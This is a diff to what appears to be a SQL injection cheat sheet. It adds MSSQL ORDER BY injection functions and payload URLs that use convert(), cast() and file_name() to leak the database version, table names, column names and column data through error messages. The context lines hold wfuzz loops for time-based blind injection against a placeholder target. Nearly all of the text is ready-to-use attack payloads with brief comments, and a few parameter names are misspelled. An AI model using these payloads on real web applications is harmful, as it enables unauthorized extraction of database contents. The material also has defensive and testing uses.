@@ -117,3 +117,34 @@ for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "https://target.dom/?param=
 	-determine column name with time-based blind SQL injection observing http response time with substr(), ascii() and if
 for i in $(seq 1 10); do wfuzz -v -c -z range,0-10 -z range,32-127 "https://target.dom/?param=1' and if(ascii(substr((select <column name> from <table name> limit FUZZ,1),$i,1))=FUZ2Z, sleep(10), null);-- -";done > <file.ext && grep "0m9" file.ext
 	-extract column with time-based blind SQL injection observing http response time with substr(), ascii() and if
+	
+	
+ORDER BY injection statements:
+convert()
+file_name()
+db_name()
+col_name()
+filegroup_name()
+object_name()
+schema_name()
+type_name()
+cast()
+
+ORDER BY injection payload examples:
+?param=*&order=convert(int,@@version)
+	-backend full query example select table_name,column_name from information_schema.columns order by convert(int,@@version)
+?param=1order=CONVERT(int,(select top(1) table_name from information_schema.columns))
+?parama=1&order=convert(int,(select top(1) COLUMN_NAME from information_schema.columns where TABLE_NAME=cast(0x7461626c655f6e616d650a as varchar)))
+	-where 0x7461626c655f6e616d650a is ascii->hex conversion for string "table_name"
+	--to convert ascii to hex from console run: echo 'table_name' | xxd -ps -
+	-query extracts columns from table name
+?param=1&order=convert(int,(select top(1) column_name from table_name))
+	-extract column name from table name
+?param=1&order=file_name(@@version)
+	-backend full query select table_name,column_name from information_schema.columns order by file_name(@@version)
+?param&order=CONVERT(int,(select top(1) table_name from information_schema.columns))
+	-extract table names of current db
+?param=1&order=convert(int,(select top(1) COLUMN_NAME from information_schema.columns where TABLE_NAME=cast(0x7461626c655f6e616d650a as varchar)))
+	-Extract column name from table
+?parma=1&order=file_name((select top(1) column_name from table_name))
+	-Extract data from column of a table
